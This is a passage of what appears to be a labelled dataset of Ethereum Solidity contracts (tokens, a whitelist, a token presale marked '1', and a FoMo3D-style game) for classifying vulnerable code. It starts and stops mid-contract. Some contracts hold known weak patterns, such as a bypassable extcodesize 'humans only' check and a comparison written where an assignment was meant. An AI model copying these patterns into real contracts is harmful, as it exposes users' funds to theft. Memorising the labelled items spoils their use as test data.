if(balanceOf(_owner) >= 100000 * 10**decimals) {            return 20;        } else if(balanceOf(_owner) >= 50000 * 10**decimals) {            return 15;        } else if(balanceOf(_owner) >= 10000 * 10**decimals) {            return 10;        } else if(balanceOf(_owner) >= 1000 * 10**decimals) {            return 5;        } else {            return 0;        }    }    function getTotalDiscount(address _owner) public view returns (uint256 percent) {        uint256 total = 0;        total += tokenDiscountPercentage(_owner);        total += referralDiscountPercentage(_owner);        return (total > 60) ? 60 : total;    }         function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {        if(tokenSaleClosed) {            return super.transferFrom(_from, _to, _value);        }        return false;    }         function transfer(address _to, uint256 _value) public returns (bool) {        if(tokenSaleClosed || msg.sender == referalAirdropsTokensAddress                        || msg.sender == saleTeamAddress) {            return super.transfer(_to, _value);        }        return false;    }}
0<CODESPLIT>contract Burnable is StandardToken {  using SafeMath for uint;     event Burn(address indexed from, uint value);  function burn(uint _value) returns (bool success) {    require(_value > 0 && balances[msg.sender] >= _value);    balances[msg.sender] = balances[msg.sender].sub(_value);    totalSupply = totalSupply.sub(_value);    Burn(msg.sender, _value);    return true;  }  function burnFrom(address _from, uint _value) returns (bool success) {    require(_from != 0x0 && _value > 0 && balances[_from] >= _value);    require(_value <= allowed[_from][msg.sender]);    balances[_from] = balances[_from].sub(_value);    totalSupply = totalSupply.sub(_value);    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);    Burn(_from, _value);    return true;  }  function transfer(address _to, uint _value) returns (bool success) {    require(_to != 0x0);      return super.transfer(_to, _value);  }  function transferFrom(address _from, address _to, uint _value) returns (bool success) {    require(_to != 0x0);      return super.transferFrom(_from, _to, _value);  }} 
0<CODESPLIT>contract ERC223ReceivingContract {     function tokenFallback(address _from, uint _value, bytes _data);} 
0<CODESPLIT>contract AnythingAppToken is Burnable, Ownable {  string public constant name = "AnyCoin";  string public constant symbol = "ANY";  uint8 public constant decimals = 18;  uint public constant INITIAL_SUPPLY = 400000000 * 1 ether;     address public releaseAgent;     bool public released = false;     mapping (address => bool) public transferAgents;     modifier canTransfer(address _sender) {    require(released || transferAgents[_sender]);    _;  }     modifier inReleaseState(bool releaseState) {    require(releaseState == released);    _;  }     modifier onlyReleaseAgent() {    require(msg.sender == releaseAgent);    _;  }     function AnythingAppToken() {    totalSupply = INITIAL_SUPPLY;    balances[msg.sender] = INITIAL_SUPPLY;    Transfer(0x0, msg.sender, INITIAL_SUPPLY);  }     function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {    require(addr != 0x0);         releaseAgent = addr;  }  function release() onlyReleaseAgent inReleaseState(false) public {    released = true;  }     function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {    require(addr != 0x0);    transferAgents[addr] = state;  }  function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {         return super.transferFrom(_from, _to, _value);  }       function transfer(address _to, uint _value, bytes _data) canTransfer(msg.sender) returns (bool success) {      require(_to != address(0));      require(_value <= balances[msg.sender]);      uint codeLength;      assembly {          codeLength := extcodesize(_to)      }      balances[msg.sender] = balances[msg.sender].sub(_value);      balances[_to] = balances[_to].add(_value);      if(codeLength>0) {          ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);          receiver.tokenFallback(msg.sender, _value, _data);      }      Transfer(msg.sender, _to, _value);      return true;    }         function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {      require(_to != address(0));      require(_value <= balances[msg.sender]);      uint codeLength;      bytes memory empty;      assembly {          codeLength := extcodesize(_to)      }      balances[msg.sender] = balances[msg.sender].sub(_value);      balances[_to] = balances[_to].add(_value);      if(codeLength>0) {          ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);          receiver.tokenFallback(msg.sender, _value, empty);      }      Transfer(msg.sender, _to, _value);      return true;    }  function burn(uint _value) onlyOwner returns (bool success) {    return super.burn(_value);  }  function burnFrom(address _from, uint _value) onlyOwner returns (bool success) {    return super.burnFrom(_from, _value);  }}
0<CODESPLIT>contract InvestorWhiteList is Ownable {  mapping (address => bool) public investorWhiteList;  mapping (address => address) public referralList;  function InvestorWhiteList() {  }  function addInvestorToWhiteList(address investor) external onlyOwner {    require(investor != 0x0 && !investorWhiteList[investor]);    investorWhiteList[investor] = true;  }  function removeInvestorFromWhiteList(address investor) external onlyOwner {    require(investor != 0x0 && investorWhiteList[investor]);    investorWhiteList[investor] = false;  }     function addReferralOf(address investor, address referral) external onlyOwner {    require(investor != 0x0 && referral != 0x0 && referralList[investor] == 0x0 && investor != referral);    referralList[investor] = referral;  }  function isAllowed(address investor) constant external returns (bool result) {    return investorWhiteList[investor];  }  function getReferralOf(address investor) constant external returns (address result) {    return referralList[investor];  }}
0<CODESPLIT>contract PriceReceiver {  address public ethPriceProvider;  modifier onlyEthPriceProvider() {    require(msg.sender == ethPriceProvider);    _;  }  function receiveEthPrice(uint ethUsdPrice) external;  function setEthPriceProvider(address provider) external;}
1<CODESPLIT>contract AnythingAppTokenPreSale is Haltable, PriceReceiver {  using SafeMath for uint;  string public constant name = "AnythingAppTokenPreSale";  AnythingAppToken public token;  InvestorWhiteList public investorWhiteList;  address public beneficiary;  uint public tokenPriceUsd;  uint public totalTokens;   uint public ethUsdRate;  uint public collected = 0;  uint public withdrawn = 0;  uint public tokensSold = 0;  uint public investorCount = 0;  uint public weiRefunded = 0;  uint public startTime;  uint public endTime;  bool public crowdsaleFinished = false;  mapping (address => bool) public refunded;  mapping (address => uint) public deposited;  uint public constant BONUS_LEVEL_1 = 40;  uint public constant BONUS_LEVEL_2 = 35;  uint public constant BONUS_LEVEL_3 = 30;  uint public firstStage;  uint public secondStage;  uint public thirdStage;  uint public constant MINIMAL_PURCHASE = 250 ether;  uint public constant LIMIT_PER_USER = 500000 ether;  event NewContribution(address indexed holder, uint tokenAmount, uint etherAmount);  event NewReferralTransfer(address indexed investor, address indexed referral, uint tokenAmount);  event Refunded(address indexed holder, uint amount);  event Deposited(address indexed holder, uint amount);  modifier preSaleActive() {    require(block.timestamp >= startTime && block.timestamp < endTime);    _;  }  modifier preSaleEnded() {    require(block.timestamp >= endTime);    _;  }  modifier inWhiteList() {    require(investorWhiteList.isAllowed(msg.sender));    _;  }  function AnythingAppTokenPreSale(    address _token,    address _beneficiary,    address _investorWhiteList,    uint _totalTokens,    uint _tokenPriceUsd,    uint _baseEthUsdPrice,    uint _firstStage,    uint _secondStage,    uint _thirdStage,    uint _startTime,    uint _endTime  ) {    ethUsdRate = _baseEthUsdPrice;    tokenPriceUsd = _tokenPriceUsd;    totalTokens = _totalTokens.mul(1 ether);    token = AnythingAppToken(_token);    investorWhiteList = InvestorWhiteList(_investorWhiteList);    beneficiary = _beneficiary;    firstStage = _firstStage.mul(1 ether);    secondStage = _secondStage.mul(1 ether);    thirdStage = _thirdStage.mul(1 ether);    startTime = _startTime;    endTime = _endTime;  }  function() payable inWhiteList {    doPurchase(msg.sender);  }  function tokenFallback(address _from, uint _value, bytes _data) public pure { }  function doPurchase(address _owner) private preSaleActive inNormalState {    if (token.balanceOf(msg.sender) == 0) investorCount++;    uint tokens = msg.value.mul(ethUsdRate).div(tokenPriceUsd);    address referral = investorWhiteList.getReferralOf(msg.sender);    uint referralBonus = calculateReferralBonus(tokens);    uint bonus = calculateBonus(tokens, referral);    tokens = tokens.add(bonus);    uint newTokensSold = tokensSold.add(tokens);    if (referralBonus > 0 && referral != 0x0) {      newTokensSold = newTokensSold.add(referralBonus);    }    require(newTokensSold <= totalTokens);    require(token.balanceOf(msg.sender).add(tokens) <= LIMIT_PER_USER);    tokensSold = newTokensSold;    collected = collected.add(msg.value);    deposited[msg.sender] = deposited[msg.sender].add(msg.value);    token.transfer(msg.sender, tokens);    NewContribution(_owner, tokens, msg.value);    if (referralBonus > 0 && referral != 0x0) {      token.transfer(referral, referralBonus);      NewReferralTransfer(msg.sender, referral, referralBonus);    }  }  function calculateBonus(uint _tokens, address _referral) private returns (uint _bonuses) {    uint bonus;    if (tokensSold < firstStage) {      bonus = BONUS_LEVEL_1;    } else if (tokensSold >= firstStage && tokensSold < secondStage) {      bonus = BONUS_LEVEL_2;    } else {      bonus = BONUS_LEVEL_3;    }    if (_referral != 0x0) {      bonus += 5;    }    return _tokens.mul(bonus).div(100);  }  function calculateReferralBonus(uint _tokens) internal constant returns (uint _bonus) {    return _tokens.mul(20).div(100);  }  function withdraw() external onlyOwner {    uint withdrawLimit = 500 ether;    if (withdrawn < withdrawLimit) {      uint toWithdraw = collected.sub(withdrawn);      if (toWithdraw + withdrawn > withdrawLimit) {        toWithdraw = withdrawLimit.sub(withdrawn);      }      beneficiary.transfer(toWithdraw);      withdrawn = withdrawn.add(toWithdraw);      return;    }    require(block.timestamp >= endTime);    beneficiary.transfer(collected);    token.transfer(beneficiary, token.balanceOf(this));    crowdsaleFinished = true;  }  function refund() external preSaleEnded inNormalState {    require(refunded[msg.sender] == false);    uint refund = deposited[msg.sender];    require(refund > 0);    deposited[msg.sender] = 0;    refunded[msg.sender] = true;    weiRefunded = weiRefunded.add(refund);    msg.sender.transfer(refund);    Refunded(msg.sender, refund);  }  function receiveEthPrice(uint ethUsdPrice) external onlyEthPriceProvider {    require(ethUsdPrice > 0);    ethUsdRate = ethUsdPrice;  }  function setEthPriceProvider(address provider) external onlyOwner {    require(provider != 0x0);    ethPriceProvider = provider;  }  function setNewWhiteList(address newWhiteList) external onlyOwner {    require(newWhiteList != 0x0);    investorWhiteList = InvestorWhiteList(newWhiteList);  }}
0<CODESPLIT>contract modularShort is F3Devents {}
0<CODESPLIT>contract NewChance is modularShort {    using SafeMath for *;    using NameFilter for string;    using F3DKeysCalcShort for uint256;    PlayerBookInterface constant private PlayerBook = PlayerBookInterface(0x2A8Cc43F5124Af19386A34DCb8BF0b2EFc3594Ba);        address private admin1 = 0xFf387ccF09fD2F01b85721e1056B49852ECD27D6;    address private admin2 = msg.sender;    string constant public name = "New Chance";    string constant public symbol = "NEWCH";    uint256 private rndExtra_ = 30 minutes;          uint256 private rndGap_ = 30 minutes;              uint256 constant private rndInit_ = 30 minutes;                     uint256 constant private rndInc_ = 10 seconds;                   uint256 constant private rndMax_ = 12 hours;                         uint256 public airDropPot_;                  uint256 public airDropTracker_ = 0;          uint256 public rID_;            mapping (address => uint256) public pIDxAddr_;               mapping (bytes32 => uint256) public pIDxName_;               mapping (uint256 => F3Ddatasets.Player) public plyr_;        mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;         mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;         mapping (uint256 => F3Ddatasets.Round) public round_;        mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;              mapping (uint256 => F3Ddatasets.TeamFee) public fees_;               mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;              constructor()        public    {		                                     		                               fees_[0] = F3Ddatasets.TeamFee(36,0);            fees_[1] = F3Ddatasets.TeamFee(49,0);            fees_[2] = F3Ddatasets.TeamFee(66,0);           fees_[3] = F3Ddatasets.TeamFee(56,0);                              potSplit_[0] = F3Ddatasets.PotSplit(7,0);           potSplit_[1] = F3Ddatasets.PotSplit(22,0);            potSplit_[2] = F3Ddatasets.PotSplit(12,0);           potSplit_[3] = F3Ddatasets.PotSplit(27,0);   	}             modifier isActivated() {        require(activated_ == true, "its not ready yet.  check ?eta in discord");        _;    }         modifier isHuman() {        address _addr = msg.sender;        uint256 _codeLength;        assembly {_codeLength := extcodesize(_addr)}        require(_codeLength == 0, "sorry humans only");        _;    }         modifier isWithinLimits(uint256 _eth) {        require(_eth >= 1000000000, "pocket lint: not a valid currency");        require(_eth <= 100000000000000000000000, "no vitalik, no");        _;    }             function()        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 buyCore(_pID, plyr_[_pID].laff, 1, _eventData_);    }         function buyXid(uint256 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affCode, _team, _eventData_);    }    function buyXaddr(address _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }    function buyXname(bytes32 _affCode, uint256 _team)        isActivated()        isHuman()        isWithinLimits(msg.value)        public        payable    {                 F3Ddatasets.EventReturns memory _eventData_ = determinePID(_eventData_);                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 buyCore(_pID, _affID, _team, _eventData_);    }         function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                          if (_affCode == 0 || _affCode == _pID)        {                         _affCode = plyr_[_pID].laff;                 } else if (_affCode != plyr_[_pID].laff) {                         plyr_[_pID].laff = _affCode;        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affCode, _team, _eth, _eventData_);    }    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == address(0) || _affCode == msg.sender)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxAddr_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth)        isActivated()        isHuman()        isWithinLimits(_eth)        public    {                 F3Ddatasets.EventReturns memory _eventData_;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _affID;                 if (_affCode == '' || _affCode == plyr_[_pID].name)        {                         _affID = plyr_[_pID].laff;                 } else {                         _affID = pIDxName_[_affCode];                         if (_affID != plyr_[_pID].laff)            {                                 plyr_[_pID].laff = _affID;            }        }                 _team = verifyTeam(_team);                 reLoadCore(_pID, _affID, _team, _eth, _eventData_);    }         function withdraw()        isActivated()        isHuman()        public    {                 uint256 _rID = rID_;                 uint256 _now = now;                 uint256 _pID = pIDxAddr_[msg.sender];                 uint256 _eth;                 if (_now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         F3Ddatasets.EventReturns memory _eventData_;             			round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);			             _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onWithdrawAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eth,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );                 } else {                         _eth = withdrawEarnings(_pID);                         if (_eth > 0)                plyr_[_pID].addr.transfer(_eth);                         emit F3Devents.onWithdraw(_pID, msg.sender, plyr_[_pID].name, _eth, _now);        }    }         function registerNameXID(string _nameString, uint256 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXIDFromDapp.value(_paid)(_addr, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXaddr(string _nameString, address _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXaddrFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }    function registerNameXname(string _nameString, bytes32 _affCode, bool _all)        isHuman()        public        payable    {        bytes32 _name = _nameString.nameFilter();        address _addr = msg.sender;        uint256 _paid = msg.value;        (bool _isNewPlayer, uint256 _affID) = PlayerBook.registerNameXnameFromDapp.value(msg.value)(msg.sender, _name, _affCode, _all);        uint256 _pID = pIDxAddr_[_addr];                 emit F3Devents.onNewName(_pID, _addr, _name, _isNewPlayer, _affID, plyr_[_affID].addr, plyr_[_affID].name, _paid, now);    }             function getBuyPrice()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(1000000000000000000)).ethRec(1000000000000000000) );        else              return ( 75000000000000 );      }         function getTimeLeft()        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;        if (_now < round_[_rID].end)            if (_now > round_[_rID].strt + rndGap_)                return( (round_[_rID].end).sub(_now) );            else                return( (round_[_rID].strt + rndGap_).sub(_now) );        else            return(0);    }         function getPlayerVaults(uint256 _pID)        public        view        returns(uint256 ,uint256, uint256)    {                 uint256 _rID = rID_;                 if (now > round_[_rID].end && round_[_rID].ended == false && round_[_rID].plyr != 0)        {                         if (round_[_rID].plyr == _pID)            {                return                (                    (plyr_[_pID].win).add( ((round_[_rID].pot).mul(48)) / 100 ),                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)   ),                    plyr_[_pID].aff                );                         } else {                return                (                    plyr_[_pID].win,                    (plyr_[_pID].gen).add(  getPlayerVaultsHelper(_pID, _rID).sub(plyrRnds_[_pID][_rID].mask)  ),                    plyr_[_pID].aff                );            }                 } else {            return            (                plyr_[_pID].win,                (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                plyr_[_pID].aff            );        }    }         function getPlayerVaultsHelper(uint256 _pID, uint256 _rID)        private        view        returns(uint256)    {        return(  ((((round_[_rID].mask).add(((((round_[_rID].pot).mul(potSplit_[round_[_rID].team].gen)) / 100).mul(1000000000000000000)) / (round_[_rID].keys))).mul(plyrRnds_[_pID][_rID].keys)) / 1000000000000000000)  );    }         function getCurrentRoundInfo()        public        view        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        return        (            round_[_rID].ico,                            _rID,                                        round_[_rID].keys,                           round_[_rID].end,                            round_[_rID].strt,                           round_[_rID].pot,                            (round_[_rID].team + (round_[_rID].plyr * 10)),                  plyr_[round_[_rID].plyr].addr,               plyr_[round_[_rID].plyr].name,               rndTmEth_[_rID][0],                          rndTmEth_[_rID][1],                          rndTmEth_[_rID][2],                          rndTmEth_[_rID][3],                          airDropTracker_ + (airDropPot_ * 1000)                       );    }         function getPlayerInfoByAddress(address _addr)        public        view        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)    {                 uint256 _rID = rID_;        if (_addr == address(0))        {            _addr == msg.sender;        }        uint256 _pID = pIDxAddr_[_addr];        return        (            _pID,                                            plyr_[_pID].name,                                plyrRnds_[_pID][_rID].keys,                      plyr_[_pID].win,                                 (plyr_[_pID].gen).add(calcUnMaskedEarnings(_pID, plyr_[_pID].lrnd)),                    plyr_[_pID].aff,                                 plyrRnds_[_pID][_rID].eth                    );    }             function buyCore(uint256 _pID, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                         core(_rID, _pID, msg.value, _affID, _team, _eventData_);                 } else {                         if (_now > round_[_rID].end && round_[_rID].ended == false)            {                 			    round_[_rID].ended = true;                _eventData_ = endRound(_eventData_);                                 _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);                _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                                 emit F3Devents.onBuyAndDistribute                (                    msg.sender,                    plyr_[_pID].name,                    msg.value,                    _eventData_.compressedData,                    _eventData_.compressedIDs,                    _eventData_.winnerAddr,                    _eventData_.winnerName,                    _eventData_.amountWon,                    _eventData_.newPot,                    _eventData_.P3DAmount,                    _eventData_.genAmount                );            }                         plyr_[_pID].gen = plyr_[_pID].gen.add(msg.value);        }    }         function reLoadCore(uint256 _pID, uint256 _affID, uint256 _team, uint256 _eth, F3Ddatasets.EventReturns memory _eventData_)        private    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))        {                                                   plyr_[_pID].gen = withdrawEarnings(_pID).sub(_eth);                         core(_rID, _pID, _eth, _affID, _team, _eventData_);                 } else if (_now > round_[_rID].end && round_[_rID].ended == false) {                         round_[_rID].ended = true;            _eventData_ = endRound(_eventData_);                         _eventData_.compressedData = _eventData_.compressedData + (_now * 1000000000000000000);            _eventData_.compressedIDs = _eventData_.compressedIDs + _pID;                         emit F3Devents.onReLoadAndDistribute            (                msg.sender,                plyr_[_pID].name,                _eventData_.compressedData,                _eventData_.compressedIDs,                _eventData_.winnerAddr,                _eventData_.winnerName,                _eventData_.amountWon,                _eventData_.newPot,                _eventData_.P3DAmount,                _eventData_.genAmount            );        }    }         function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)        private    {                 if (plyrRnds_[_pID][_rID].keys == 0)            _eventData_ = managePlayer(_pID, _eventData_);                 if (round_[_rID].eth < 100000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 1000000000000000000)        {            uint256 _availableLimit = (1000000000000000000).sub(plyrRnds_[_pID][_rID].eth);            uint256 _refund = _eth.sub(_availableLimit);            plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);            _eth = _availableLimit;        }                 if (_eth > 1000000000)        {                         uint256 _keys = (round_[_rID].eth).keysRec(_eth);                         if (_keys >= 1000000000000000000)            {            updateTimer(_keys, _rID);                         if (round_[_rID].plyr != _pID)                round_[_rID].plyr = _pID;            if (round_[_rID].team != _team)                round_[_rID].team = _team;                         _eventData_.compressedData = _eventData_.compressedData + 100;        }                         if (_eth >= 100000000000000000)            {            airDropTracker_++;            if (airdrop() == true)            {                                 uint256 _prize;                if (_eth >= 10000000000000000000)                {                                         _prize = ((airDropPot_).mul(75)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                } else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {                                         _prize = ((airDropPot_).mul(50)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 200000000000000000000000000000000;                } else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {                                         _prize = ((airDropPot_).mul(25)) / 100;                    plyr_[_pID].win = (plyr_[_pID].win).add(_prize);                                         airDropPot_ = (airDropPot_).sub(_prize);                                         _eventData_.compressedData += 300000000000000000000000000000000;                }                                 _eventData_.compressedData += 10000000000000000000000000000000;                                 _eventData_.compressedData += _prize * 1000000000000000000000000000000000;                                 airDropTracker_ = 0;            }        }                         _eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);                         plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);            plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);                         round_[_rID].keys = _keys.add(round_[_rID].keys);            round_[_rID].eth = _eth.add(round_[_rID].eth);            rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);                         _eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);            _eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);             		    endTx(_pID, _team, _eth, _keys, _eventData_);        }    }             function calcUnMaskedEarnings(uint256 _pID, uint256 _rIDlast)        private        view        returns(uint256)    {        return(  (((round_[_rIDlast].mask).mul(plyrRnds_[_pID][_rIDlast].keys)) / (1000000000000000000)).sub(plyrRnds_[_pID][_rIDlast].mask)  );    }         function calcKeysReceived(uint256 _rID, uint256 _eth)        public        view        returns(uint256)    {                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].eth).keysRec(_eth) );        else              return ( (_eth).keys() );    }         function iWantXKeys(uint256 _keys)        public        view        returns(uint256)    {                 uint256 _rID = rID_;                 uint256 _now = now;                 if (_now > round_[_rID].strt + rndGap_ && (_now <= round_[_rID].end || (_now > round_[_rID].end && round_[_rID].plyr == 0)))            return ( (round_[_rID].keys.add(_keys)).ethRec(_keys) );        else              return ( (_keys).eth() );    }             function receivePlayerInfo(uint256 _pID, address _addr, bytes32 _name, uint256 _laff)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if (pIDxAddr_[_addr] != _pID)            pIDxAddr_[_addr] = _pID;        if (pIDxName_[_name] != _pID)            pIDxName_[_name] = _pID;        if (plyr_[_pID].addr != _addr)            plyr_[_pID].addr = _addr;        if (plyr_[_pID].name != _name)            plyr_[_pID].name = _name;        if (plyr_[_pID].laff != _laff)            plyr_[_pID].laff = _laff;        if (plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function receivePlayerNameList(uint256 _pID, bytes32 _name)        external    {        require (msg.sender == address(PlayerBook), "your not playerNames contract... hmmm..");        if(plyrNames_[_pID][_name] == false)            plyrNames_[_pID][_name] = true;    }         function determinePID(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {        uint256 _pID = pIDxAddr_[msg.sender];                 if (_pID == 0)        {                         _pID = PlayerBook.getPlayerID(msg.sender);            bytes32 _name = PlayerBook.getPlayerName(_pID);            uint256 _laff = PlayerBook.getPlayerLAff(_pID);                         pIDxAddr_[msg.sender] = _pID;            plyr_[_pID].addr = msg.sender;            if (_name != "")            {                pIDxName_[_name] = _pID;                plyr_[_pID].name = _name;                plyrNames_[_pID][_name] = true;            }            if (_laff != 0 && _laff != _pID)                plyr_[_pID].laff = _laff;                         _eventData_.compressedData = _eventData_.compressedData + 1;        }        return (_eventData_);    }         function verifyTeam(uint256 _team)        private        pure        returns (uint256)    {        if (_team < 0 || _team > 3)            return(2);        else            return(_team);    }         function managePlayer(uint256 _pID, F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                          if (plyr_[_pID].lrnd != 0)            updateGenVault(_pID, plyr_[_pID].lrnd);                 plyr_[_pID].lrnd = rID_;                 _eventData_.compressedData = _eventData_.compressedData + 10;        return(_eventData_);    }         function endRound(F3Ddatasets.EventReturns memory _eventData_)        private        returns (F3Ddatasets.EventReturns)    {                 uint256 _rID = rID_;                 uint256 _winPID = round_[_rID].plyr;        uint256 _winTID = round_[_rID].team;                 uint256 _pot = round_[_rID].pot;                          uint256 _win = (_pot.mul(48)) / 100;        uint256 _com = (_pot.mul(20)) / 100;        uint256 _gen = (_pot.mul(potSplit_[_winTID].gen)) / 100;        uint256 _p3d = (_pot.mul(potSplit_[_winTID].p3d)) / 100;        uint256 _res = (((_pot.sub(_win)).sub(_com)).sub(_gen)).sub(_p3d);                 uint256 _ppt = (_gen.mul(1000000000000000000)) / (round_[_rID].keys);        uint256 _dust = _gen.sub((_ppt.mul(round_[_rID].keys)) / 1000000000000000000);        if (_dust > 0)        {            _gen = _gen.sub(_dust);            _res = _res.add(_dust);        }                 plyr_[_winPID].win = _win.add(plyr_[_winPID].win);                 admin1.transfer(_com.sub(_com / 2));        admin2.transfer(_com / 2);        round_[_rID].pot = _pot.add(_p3d);                 round_[_rID].mask = _ppt.add(round_[_rID].mask);                 _eventData_.compressedData = _eventData_.compressedData + (round_[_rID].end * 1000000);        _eventData_.compressedIDs = _eventData_.compressedIDs + (_winPID * 100000000000000000000000000) + (_winTID * 100000000000000000);        _eventData_.winnerAddr = plyr_[_winPID].addr;        _eventData_.winnerName = plyr_[_winPID].name;        _eventData_.amountWon = _win;        _eventData_.genAmount = _gen;        _eventData_.P3DAmount = _p3d;        